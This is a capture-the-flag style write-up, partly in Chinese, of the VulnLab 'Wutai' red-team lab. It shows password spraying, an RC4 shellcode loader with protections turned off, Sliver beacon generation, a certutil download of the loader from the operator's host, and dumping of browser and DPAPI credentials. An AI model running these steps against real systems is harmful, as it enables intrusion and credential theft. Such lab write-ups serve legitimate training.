---
title : "VulnLab - Wutai Writeup"
date: 2023-11-02 07:23:00 +0530
categories: [Red Team Lab]
tags: [Wutai]
---

![image](/assets/post_img/wutai.png)

## <span style="color:lightblue">Lab Intro</span>

**The Wutai Group has tasked you with performing a penetration test on its networks. This includes the Wutai Parent Company & its subsidiary Junon. Wutai is concerned about its security posture since a leak of domain usernames was found online on pastebin.**

---

https://pastebin.com/BBZkJGU1

KE37vTed5S

**The goal of this test is to reach Enterprise Administrator in the wutai.vl domain. Wutai employs a small SOC but its blue team capabilities are still on a rather basic level.
Wutai's external systems can be reached through the RTL VPN on the 172.16.20.0/24 network. Everything is in scope except the infrastructure (172.16.xx.1/172.16.xx.2). To access the network add the following line to your ovpn file:
Completing the lab awards a badge.**

---

```
Wutai集团委托您对其网络进行渗透测试
其中包括Wutai母公司及其子公司Junon
自从在 Pastebin 上发现域名用户名泄露后,Wutai对其安全状况感到担忧

此测试的目标是访问 wutai.vl 域中的企业管理员 Enterprise Administrator
Wutai 采用小型 SOC，但其蓝队能力仍处于相当基础的水平

Wutai的外部系统可以通过172.16.20.0/24网络上的VPN到达
除基础设施 (172.16.xx.1/172.16.xx.2) 外,所有内容均在范围内

完成实验室将授予徽章
```

---

## <span style="color:lightgreen">Hints & Comments</span>

- There is an outbound proxy server - if you can't connect back check if your payload is proxy-aware
- Check for common mistakes that *people* make, weak passwords, password reuse across different accounts 
- Assume there is user activity in the lab so backdooring things can make sense


```
提示:

outbound proxy server
weak passwords 
实验室中有其他用户 activity
```

---

## <span style="color:lightblue">Recon</span>
### <span style="color:lightgreen">pastebin</span>

```
https://pastebin.com/BBZkJGU1

KE37vTed5S
```

```
Katie.Shaw@work.junon.vl
Marion.Green@work.junon.vl
...
```

```bash
cat users.txt|wc
    300     301    8615


cut -d '@' -f 1 users.txt > users1.txt
cat users1.txt| sed 's/^ *//g' > usernames.txt
rm -rf users.txt users1.txt
tail usernames.txt
Adam.Henderson
Elliot.Brown
Clive.Ellis
Chloe.Hill
Paul.Smith
Malcolm.Brown
Clifford.Bradley
Daniel.Yates
Emily.Conway
Damien.Howell
```
---

### <span style="color:lightgreen">Recon</span>

```bash
nmap -sC -sV -T4 -Pn 172.16.20.3-254 -n -vv -A --min-parallelism=50 --max-parallelism=150 --min-rate 5000 > nmap_tcp_scan.conf

map scan report for 172.16.20.50
Host is up, received user-set (0.35s latency).
Scanned at 2023-11-02 22:20:20 EDT for 382s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:cd:1e:d9:39:fb:be:6d:c4:f4:ba:ab:58:92:17:e9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPXNwoJYzOzz0K2JR4AtPFa3RMCctqlV7bX/0r7S4+kLU1ZxrqpGq8rFsciMBgiXrFUPcMmbQDBgWl/c2dp2L5Q=
|   256 5c:e8:e2:b1:00:f7:a2:b0:fa:15:47:98:6c:b9:4e:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICm80WNVgRnaq/3iDVR7hpPOZmTgfCKNehGpSzteXXDz
8080/tcp open  http-proxy syn-ack Squid http proxy 5.2
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/5.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

map scan report for 172.16.20.100
Host is up, received user-set (0.35s latency).
Scanned at 2023-11-02 22:26:42 EDT for 371s
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9a:a5:ac:e6:b0:46:8d:d2:24:f7:33:c3:ec:9f:14:bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL3QYz4aZ2JkAZGNJeNy94LKyMYM+ic7soYWQeQ6+VGX8ITvWVWtNBonRMl8xfm6wOuYBC+eU9y/nzfgHXWNX9U=
|   256 d8:74:a8:05:04:19:6d:d8:74:f9:30:9d:ae:05:f4:df (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK/qP6CibCG23Cy7+ivlRe2oQXfum2HKGjZKI4uaZeaQ
443/tcp open  ssl/http syn-ack nginx
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| ssl-cert: Subject: commonName=wutai-vdi-gw/organizationName=None/stateOrProvinceName=VA/countryName=US/localityName=None/organizationalUnitName=DoFu/emailAddress=none@none.none
| Issuer: commonName=wutai-vdi-gw/organizationName=None/stateOrProvinceName=VA/countryName=US/localityName=None/organizationalUnitName=DoFu/emailAddress=none@none.none
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-03-10T15:01:48
| Not valid after:  2028-03-08T15:01:48
| MD5:   cb41:82f3:03f9:4d5d:1a7e:1727:dc81:cac1
| SHA-1: 21f2:33b0:0846:f2d1:5853:c5c4:4366:de94:3774:a7f1
| -----BEGIN CERTIFICATE-----
| MIID2zCCAsOgAwIBAgIUHtMlP/D54ypWpXaokL6gz4VFmWkwDQYJKoZIhvcNAQEL
| BQAwfTELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAlZBMQ0wCwYDVQQHDAROb25lMQ0w
| CwYDVQQKDAROb25lMQ0wCwYDVQQLDAREb0Z1MRUwEwYDVQQDDAx3dXRhaS12ZGkt
| Z3cxHTAbBgkqhkiG9w0BCQEWDm5vbmVAbm9uZS5ub25lMB4XDTIzMDMxMDE1MDE0
| OFoXDTI4MDMwODE1MDE0OFowfTELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAlZBMQ0w
| CwYDVQQHDAROb25lMQ0wCwYDVQQKDAROb25lMQ0wCwYDVQQLDAREb0Z1MRUwEwYD
| VQQDDAx3dXRhaS12ZGktZ3cxHTAbBgkqhkiG9w0BCQEWDm5vbmVAbm9uZS5ub25l
| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5lSZMXTDldBRJE51sxB/
| uR9cVmh4/aIj4IH44zcymAPvrNeBWs4nySaVx9jxul6OfyTcNOM3/AWi/d/DA+nx
| mTn+H35mWV6QX81356gCbbJrVmP2tQC6q9dfn0l7D2E64PCH4MO/PA25TmEs6rGi
| P57AvGgrltg4wUJGbJJP8EMoZTxagsV+J6txDqAcYmhk17OSlzQLSMN4cwRUTzYD
| dRchmQR4PtcaZU+ybiwiELs+/xX0vlBrNwTCkUilqDa23NNmu3SzjEVHmNKa5WlJ
| cWg/rRSFJ8TogZsCmCHhLX08gckqSpjF4SehbPRmNOSEo+hufSUtbNsXFldVkHBG
| pwIDAQABo1MwUTAdBgNVHQ4EFgQUd1ly81+hDgaR+PLyIIAL5gzLfk4wHwYDVR0j
| BBgwFoAUd1ly81+hDgaR+PLyIIAL5gzLfk4wDwYDVR0TAQH/BAUwAwEB/zANBgkq
| hkiG9w0BAQsFAAOCAQEAAfoVKBVRgBjwWcCCKFXS23UXjNNRpDQG1mTRmuXJlvsD
| guJwk+ThWcEidRmdu+VEtMrXq0QoB2yP5QG60wFH1aUZ/Yi02s4h8rjkC+Bt4hpV
| pZj5MPbZFzCi0a7a4TtybluV3g2Kzs2xv8vNRZXYGqJyGcz1sCF6luXzUURASInl
| unGi4GK3jw1tuI29hpE3ElGM0zh8mVdHVIiOTtTB1Dj0ePbtCrIesixW7hHicUup
| mzNV27bmQVXc7MuaC65PF0qQ1ceCdQeWcFFfwfD3CCn5n2UXWQdQybOLzPhBMhlw
| vGM8WlHgcmo6M/7QTXP9uHTKH4/CnZGsjQ6iHPLduA==
|_-----END CERTIFICATE-----
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

#### <span style="color:lightgreen">172.16.20.50 - TCP 8080</span>

```
http-proxy syn-ack Squid http proxy 5.2

Squid HTTP Proxy 是一种非常流行的开源代理服务器软件，用于提供缓存和代理功能，主要用于加速和优化 Web 请求
Squid 允许客户端计算机通过代理服务器访问 Internet
```

```bash
/etc/proxychains4.conf
http 172.16.20.50 8080
```

---

#### <span style="color:lightgreen">172.16.20.100 - TCP 443</span>

![](/assets/post_img/Kasm_Workspaces.png)

```
https://kasmweb.com/

Kasm Workspaces 是一个虚拟桌面和远程办公解决方案，用于提供安全的、可扩展的云端工作环境

但是目前没有相关凭据
```

---

#### <span style="color:lightgreen">通过Squid http proxy 探测内网可达网段</span>

```bash
/etc/proxychains4.conf
http 172.16.20.50 8080
```

#### <span style="color:lightgreen">Map Network Hosts</span>
```
https://github.com/Pennyw0rth/NetExec
https://www.netexec.wiki/
```

```bash
proxychains4 -q ./nxc smb 172.16.20.0/23
SMB         172.16.21.180   445    S021M010         [*] Windows 10.0 Build 20348 x64 (name:S021M010) (domain:work.junon.vl) (signing:False) (SMBv1:False)
SMB         172.16.21.195   445    S021M015         [*] Windows 10.0 Build 20348 x64 (name:S021M015) (domain:work.junon.vl) (signing:False) (SMBv1:False)
SMB         172.16.21.200   445    S021M005         [*] Windows 10.0 Build 20348 x64 (name:S021M005) (domain:work.junon.vl) (signing:True) (SMBv1:False)
SMB         172.16.21.222   445    S021M200         [*] Windows 10.0 Build 20348 x64 (name:S021M200) (domain:eu.junon.vl) (signing:True) (SMBv1:False)
```
172.16.21.0/24
---

```
proxychains4 -q nmap -sT -p 22,80,88,443,445,3389,5985 172.16.21.3-254 -oA 21.txt


172.16.21.180
172.16.21.195
172.16.21.200
172.16.21.222
172.16.21.240

https://172.16.21.120/ui/
172.16.21.120 https://172.16.21.120/ui/ ESXI
http://172.16.21.180/  iis
http://172.16.21.195/
http://172.16.21.200/
http://172.16.21.222/certsrv ADCS

172.16.21.240 https://s021v010.work.junon.vl/ Bitwarden Web Vault
```

#### <span style="color:lightgreen">SSH protocol</span>

```bash
proxychains4 -q ./nxc ssh 172.16.21.3-254

SSH         172.16.21.3     22     172.16.21.3      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         172.16.21.50    22     172.16.21.50     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         172.16.21.100   22     172.16.21.100    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         172.16.21.240   22     172.16.21.240    [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

#### <span style="color:lightgreen">Enumerate Null Sessions</span>

```bash
proxychains4 -q ./nxc smb 172.16.21.3-254 -u '' -p '' --shares
```

#### <span style="color:lightgreen">ASREPRoast</span>

```
proxychains4 -q crackmapexec ldap 172.16.21.200 -u usernames.txt -p '' --asreproast asrep.txt

nothing
```
#### <span style="color:lightgreen">Password Spraying</span>

```
proxychains4 -q ./nxc smb 172.16.21.200 -u usernames.txt -p Summer2023 --continue-on-success > brute.txt


Wutai2023
Junon2023

cat Desktop/brute.txt|grep +

SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Wendy.Vincent:Summer2023
SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Melanie.Mueller:Summer2023
SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Terry.Lowe:Summer2023
SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Hazel.Simpson:Summer2023
```

---

#### <span style="color:lightgreen">kerbrute</span>

```
proxychains4 -q /usr/share/doc/python3-impacket/examples/GetNPUsers.py work.junon.vl/ -no-pass -usersfile usernames.txt


```

---

## <span style="color:lightblue">Foothold</span>
### <span style="color:lightgreen">Kasm Workspaces</span>

```
Terry.Lowe@work.junon.vl
Summer2023
```

![](/assets/post_img/Wutai_Foothold.png)

```powershell
C:\Users\Hazel.Simpson>whoami
work-junon\hazel.simpson

C:\Users\Hazel.Simpson>hostname
S021M010
```

---

### <span style="color:lightblue">Domain Enumeration from Windows</span>

```powershell
C:\Users\Hazel.Simpson>whoami
work-junon\hazel.simpson

C:\Users\Hazel.Simpson>hostname
S021M010

C:\Users\Hazel.Simpson>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.21.180
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.21.1

C:\Users\Hazel.Simpson>whoami /all

USER INFORMATION
----------------

User Name                SID
======================== ==============================================
work-junon\hazel.simpson S-1-5-21-1112787665-3955584987-2510362858-1398


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
WORK-JUNON\remote                          Group            S-1-5-21-1112787665-3955584987-2510362858-1362 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

C:\Users\Hazel.Simpson>echo %LOGONSERVER%
\\S021M005

C:\Users\Hazel.Simpson>net user hazel.simpson /domain
The request will be processed at a domain controller for domain work.junon.vl.

User name                    Hazel.Simpson
Full Name                    Hazel Simpson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/4/2023 10:33:58 AM
Password expires             Never
Password changeable          4/5/2023 10:33:58 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory               \\S021M015\homes\Hazel.Simpson
Last logon                   11/3/2023 4:08:41 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *remote
The command completed successfully.


Home directory               \\S021M015\homes\Hazel.Simpson

域用户的目录 被分配在域内的另外一台服务器上S021M015
```

![](/assets/post_img/2023-11-03%20190506_Wutai_domainuser_home_dir.png)

```
flag1
\\S021M015\homes\Amy.Ball\flag.txt
VL{3387261d92644002942061cfea267da2}
```
![](/assets/post_img/2023-11-03%20190801_Wutai_flag1_AmyBallhomedir.png)

```
所有目录域用户均有完全控制权限
```

```
flag2
C:\>type user.txt
VL{f8ac47197978c087b4b882e84fbdc328}
```

```
\\S021M015\manageengine\config

<securepass>
    <username>svc_me</password>
    <password>SP81274145f4a5857b839ee7b500f1d66e8a044d12211781b515e7bae67bb7abce</password>
</securepass>
```

```
隐藏目录

C:\>net view \\S021M015 /all
Shared resources at \\S021M015



Share name              Type  Used as  Comment

-------------------------------------------------------------------------------
ADMIN$                  Disk           Remote Admin
C$                      Disk           Default share
finance$                Disk
homes                   Disk           user home directories
install$                Disk
IPC$                    IPC            Remote IPC
it                      Disk
manageengine            Disk
transfer                Disk
UpdateServicesPackages  Disk           A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
WsusContent             Disk           A network share to be used by Local Publishing to place published content on this WSUS system.
WSUSTemp                Disk           A network share used by Local Publishing from a Remote WSUS Console Instance.
The command completed successfully.

install$    
finance$    nothing

C:\>\\S021M015\install$\SecurePass.exe
Usage: \\S021M015\install$\SecurePass.exe -p <password>

C:\>\\S021M015\install$\SecurePass.exe -p test
SPf60eaec0a7d02c3f7f897b21afb7f6e39fb635d01ca5f5339dcd0a8eeaf90a0d

C:\>\\S021M015\install$\SecurePass.exe -p test1
SPfc073fbf3c7d7d607e815379a5fc5658014e99d1cc406f1e8177347737bb15b0

存在一个二进制文件,后续可进行逆向
```

```
机器还存在wsl 但是我们没权限访问

机器iis目录可写 可提权
```
```
C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 44D3-B01E

 Directory of C:\Users

11/03/2023  03:31 AM    <DIR>          .
04/08/2023  12:34 AM    <DIR>          .NET v2.0
04/08/2023  12:34 AM    <DIR>          .NET v2.0 Classic
04/08/2023  12:34 AM    <DIR>          .NET v4.5
04/08/2023  12:34 AM    <DIR>          .NET v4.5 Classic
04/07/2023  05:14 AM    <DIR>          Administrator
07/15/2023  01:37 AM    <DIR>          administrator.WORK-JUNON
04/08/2023  12:34 AM    <DIR>          Classic .NET AppPool
07/18/2023  12:14 AM    <DIR>          dom-fstewart
11/03/2023  02:44 AM    <DIR>          Hazel.Simpson
04/07/2023  03:36 AM    <DIR>          Public
11/03/2023  03:32 AM    <DIR>          Terry.Lowe
03/26/2023  01:33 AM    <DIR>          vdi_user

域管登陆过 administrator.WORK-JUNON


还有一个vdi_user目录 可疑
```
```
C:\ProgramData>dir
 Volume in drive C has no label.
 Volume Serial Number is 44D3-B01E

 Directory of C:\ProgramData

04/04/2023  01:11 PM    <DIR>          Avira

机器存在av 小红伞以及defender
```
```
PS C:\> [System.Net.WebProxy]::GetDefaultProxy()


Address               : http://172.16.21.50:8080/
BypassProxyOnLocal    : False
BypassList            : {^(?:.*://)?htmd\.com(?::[0-9]{1,5})?$, ^(?:.*://)?microsoft\.com\.(?::[0-9]{1,5})?$}
Credentials           :
UseDefaultCredentials : False
BypassArrayList       : {^(?:.*://)?htmd\.com(?::[0-9]{1,5})?$, ^(?:.*://)?microsoft\.com\.(?::[0-9]{1,5})?$}
```
### <span style="color:lightblue">Domain Enumeration from Linux</span>

### <span style="color:lightgreen">bloodhound-python</span>

```bash
 proxychains4 -q bloodhound-python -c all --disable-pooling -w 1 -u "Terry.Lowe" -p 'Summer2023' -d work.junon.vl -dc dc.work.junon.vl -ns 172.16.21.200 --dns-tcp --zip
INFO: Found AD domain: work.junon.vl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.work.junon.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Connecting to LDAP server: dc.work.junon.vl
INFO: Found 312 users
INFO: Found 61 groups
INFO: Found 5 gpos
INFO: Found 9 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 1 workers
INFO: Querying computer: S021W105.work.junon.vl
INFO: Querying computer: S021M015.work.junon.vl
INFO: Querying computer: S021M010.work.junon.vl
INFO: Querying computer: S021M005.work.junon.vl
INFO: Done in 01M 47S
INFO: Compressing output into 20231103072820_bloodhound.zip
```

### <span style="color:lightgreen">other</span>

```bash
proxychains4 -q ./nxc smb 172.16.21.3-254 -u "Terry.Lowe" -p 'Summer2023' --shares
```

```bash
proxychains4 -q ./nxc smb 172.16.21.3-254 --gen-relay-list relay.txt
SMB         172.16.21.180   445    S021M010         [*] Windows 10.0 Build 20348 x64 (name:S021M010) (domain:work.junon.vl) (signing:False) (SMBv1:False)
SMB         172.16.21.200   445    S021M005         [*] Windows 10.0 Build 20348 x64 (name:S021M005) (domain:work.junon.vl) (signing:True) (SMBv1:False)
SMB         172.16.21.222   445    S021M200         [*] Windows 10.0 Build 20348 x64 (name:S021M200) (domain:eu.junon.vl) (signing:True) (SMBv1:False)
SMB         172.16.21.195   445    S021M015         [*] Windows 10.0 Build 20348 x64 (name:S021M015) (domain:work.junon.vl) (signing:False) (SMBv1:False)
```

```
proxychains4 -q ./nxc  crackmapexec 172.16.21.200 -u "Terry.Lowe" -p 'Summer2023' -M map
proxychains4 -q ./nxc  ldap 172.16.21.200 -u "Terry.Lowe" -p 'Summer2023' -M map

proxychains4 -q crackmapexec ldap 172.16.21.200 -u "Terry.Lowe" -p 'Summer2023' -M adcs
nothing

proxychains4 -q crackmapexec ssh 172.16.21.3-254 -u "Terry.Lowe" -p 'Summer2023' --continue-on-success

默认情况下如果linux加入域 所有域用户均可登录
```

---

## <span style="color:lightblue">Writing a Loader</span>

```
sliver 生成shellcode
```

### <span style="color:lightgreen">rc4</span>

```python
import sys

def rc4(data, key):
	keylen = len(key)
	s = list(range(256))
	j = 0
	for i in range(256):
		j = (j + s[i] + key[i % keylen]) % 256
		s[i], s[j] = s[j], s[i]

	i = 0
	j = 0
	encrypted = bytearray()
	for n in range(len(data)):
		i = (i + 1) % 256
		j = (j + s[i]) % 256
		s[i], s[j] = s[j], s[i]
		encrypted.append(data[n] ^ s[(s[i] + s[j]) % 256])

	return encrypted

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print("Usage: ./rc4.py <key> <filename>")
		exit(0)

	key = sys.argv[1]
	filename = sys.argv[2]

	with open(filename, 'rb') as f:
		data = f.read()

	encrypted = rc4(data, key.encode())

	with open(f"{filename}.enc", 'wb') as f:
		f.write(encrypted)

	print(f"Written {filename}.enc")%
```

```bash
python3 rc4.py advapi43.dll http.bin

hexdump -v -e '1/2 "dw 0%.4xh\n"' http.bin.enc|tee out.txt

-rw-r--r--  1 kali kali  11013340 Nov  3 08:03  http.bin.enc
```


```c++
源代码暂时不放
```

```
To compile, you need to put the source into a new C++ Console project in Visual Studio.
Then right click the project and add the "MASM" Build Dependency.
You also want to change those:

Configuration -> C/C++ -> Code Generation -> Runtime Library: MT
Configuration -> C/C++ -> Code Generation -> Security Check:  GS-
Configuration -> C/C++ -> Linker -> Debugging -> No
Configuration -> C/C++ -> Linker -> Dynamic Base -> No
Configuration -> C/C++ -> Linker -> DEP -> No
```

```
data.asm

.CODE
RunData PROC
... hex code
RunData ENDP
END
```

```
编译即可
```
![](/assets/post_img/2023-11-03%20201747_Wutai_Loaders_scan.png)


## <span style="color:lightblue">Getting a Beacon</span>

```bash
[server] sliver > generate beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --http 10.8.0.227?proxy=http://172.16.21.50:8080,10.8.0.227?driver=wininet --name wutai-http --save /home/kali/Desktop/http.bin -G --skip-symbols

[server] sliver > http
```

```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

受害机器:

certutil.exe -urlcache -f http://10.8.0.227:8000/Loaders.exe Loaders.exe
iwr http://10.8.0.227:8000/Loaders.exe -usebasicparsing -outfile qq.exe
```

```bash
use 153139b3-56bb-40f2-984f-84e8f4b9ac4f
interactive

use 48f7e70d-d729-411e-b281-8377064863bf
whoami

WORK-JUNON\Hazel.Simpson
```

![](/assets/post_img/2023-11-03%20204024_Wutai_initbeacon.png)

## <span style="color:lightblue">Reverse Engineering & Lateral Movement</span>

```bash
[server] sliver (wutai-http) > download SecurePass.exe

[*] Wrote 144896 bytes (1 file successfully, 0 files unsuccessfully) to /home/kali/Desktop/SecurePass.exe
```

```
C:\Users\redteam\Desktop>SecurePass.exe -p test
SP714999519f07c2e8e456bb8b90d7f00af47afc240fdd828cc3fcf6cb5dcb1831

C:\Users\redteam\Desktop>SecurePass.exe -p test
SP74456250ea5eeb79645227b70b79a0c44ae189aed29eb200a85a8a04b8770ed7
```

```
<securepass>
    <username>svc_me</password>
    <password>SP81274145f4a5857b839ee7b500f1d66e8a044d12211781b515e7bae67bb7abce</password>
</securepass>
```

```
IDA 启动

main

Debugger -> add Parameters (-p test)

F2设置断点

开始Debugger
```

```
省略部分内容
后续补PWN相关知识
```

```
https://github.com/mmozeiko/aes-finder

svc_me
jYEp9bq32KFLVL!
```

```
Description:
Manage Engine Admin Account

管理引擎管理员帐户

https://172.16.21.195:8383/client#/login

ManageEngine Endpoint Central 11

桌面终端安全管理软件
```

```
svc_me
jYEp9bq32KFLVL!

账号尝试admin 但是需要多因素验证
Two Factor Authentication

\\S021M015\it\vault\svc.kdbx

KeePassXC是一个自由开源的密码管理器

成功登进去 然后查看验证码

成功登录ManageEngine Endpoint Central 11 面板
```

![](/assets/post_img/2023-11-03%20220353_Wutai_S021W105_UI.png)

```
导航到

Actions
System Manager
PowerShell

获取一个System beacon以及普通用户的beacon
```

![](/assets/post_img/2023-11-04%20043816_Wutai_S021W105_System.png)

![](/assets/post_img/2023-11-04%20044422_Wutai_202311040444_Sessions.png)

```
S021M010 172.16.21.180
S021W105 172.16.21.140

目前已经获取域内两台机器的完全控制权限

PS:S021M010 的System晚点在获取
```

---


## <span style="color:lightblue">Browser Credentials & Playing with Bitwarden</span>

```bash
[server] sliver (wutai-http) > info

        Session ID: b5fc3a22-b5bb-4aef-a624-5dcb505643ca
              Name: wutai-http
          Hostname: S021W105
              UUID: b3614d56-27fd-80c6-89fe-f7e7d62aea96
          Username: NT AUTHORITY\SYSTEM
               UID: S-1-5-18
               GID: S-1-5-18
               PID: 8080
                OS: windows
           Version: 10 build 19045 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://10.8.0.227?driver=wininet
    Remote Address: 172.16.20.2:52862
         Proxy URL:
Reconnect Interval: 1m0s
     First Contact: Fri Nov  3 16:40:43 EDT 2023 (13m30s ago)
      Last Checkin: Fri Nov  3 16:54:12 EDT 2023 (1s ago)
```

sharpdpapi
```
[server] sliver (wutai-http) > sharpdpapi -s -- machinetriage

[*] Triaging System Credentials


Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

  CredFile           : 0A5F8F2A8901A4C0CA2122488819BACB

    guidMasterKey    : {3a265f00-cb47-4b68-9483-c4763064b338}
    size             : 576
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    LastWritten      : 4/4/2023 8:44:18 AM
    TargetName       : Domain:batch=TaskScheduler:Task:{91F9A551-5750-44B2-B185-E9EB23AC2108}
    TargetAlias      :
    Comment          :
    UserName         : WORK-JUNON\carly.adams
    Credential       : ZMskoMXML_qC17
```

```
TaskScheduler
UserName         : WORK-JUNON\carly.adams
Credential       : ZMskoMXML_qC17
```

```
bloodhound nothing
```

sharpchrome
```
切换到carly.adams用户session

[server] sliver (wutai-http) > whoami

Logon ID: WORK-JUNON\carly.adams
[*] Current Token ID: WORK-JUNON\carly.adams

[server] sliver (wutai-http) > sharpchrome -s -- logins /browser:edge

---  Credential (Path: C:\Users\Carly.Adams\AppData\Local\Microsoft\Edge\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\Carly.Adams\AppData\Local\Microsoft\Edge\User Data\Default\Login Data,https://s021v010/,https://s021v010/,3/26/2023 12:57:53 PM,13324334273603338,carly.adams@junon.vl,c4rlyr0cks!!


https://s021v010/
carly.adams@junon.vl,c4rlyr0cks!!
```

```
C:\Windows\Tasks>ping s021v010

Pinging s021v010.work.junon.vl [172.16.21.240] with 32 bytes of data:
```

```
https://172.16.21.240/#/login

使用获取到的凭据登录

Bitwarden是一款自由且开源的密码管理服务，用户可在加密的保管库中存储敏感信息
```

```
获取到了ESXI的相关凭据

root
7d3XHR8uTgg2aB
```

```
https://172.16.21.120/ui/#/login

root
7d3XHR8uTgg2aB

只有一台虚拟机

S021V010
Ubuntu Linux (64-bit) 
172.16.21.240

Bitwarden的生产服务器

Notes处泄漏机器相关凭据信息

Root: kLVy28KH6X
```

SSH Login S021V010

```
proxychains4 -q ssh root@172.16.21.240

root@s021v010:~# id
uid=0(root) gid=0(root) groups=0(root)
root@s021v010:~# whoami
root

root@s021v010:~# ss -lnt
```

```
root@s021v010:~# docker ps
CONTAINER ID   IMAGE                              COMMAND            CREATED        STATUS                  PORTS                                                                                    NAMES
5cc679b084c0   bitwarden/nginx:2023.3.0           "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   80/tcp, 0.0.0.0:80->8080/tcp, :::80->8080/tcp, 0.0.0.0:443->8443/tcp, :::443->8443/tcp   bitwarden-nginx
8b11acc65796   bitwarden/admin:2023.3.0           "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-admin
44228b2d8f53   bitwarden/mssql:2023.3.0           "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)                                                                                            bitwarden-mssql
79d6d6bbc52a   bitwarden/attachments:2023.3.0     "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)                                                                                            bitwarden-attachments
a18d2d46b7f9   bitwarden/web:2023.3.0             "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)                                                                                            bitwarden-web
0b324073a17e   bitwarden/notifications:2023.3.0   "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-notifications
230355d545c1   bitwarden/events:2023.3.0          "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-events
efe6bf763230   bitwarden/api:2023.3.0             "/entrypoint.sh"   7 months ago   Up 14 hours (healthy)   5000/tcp                                                                                 bitwarden-api
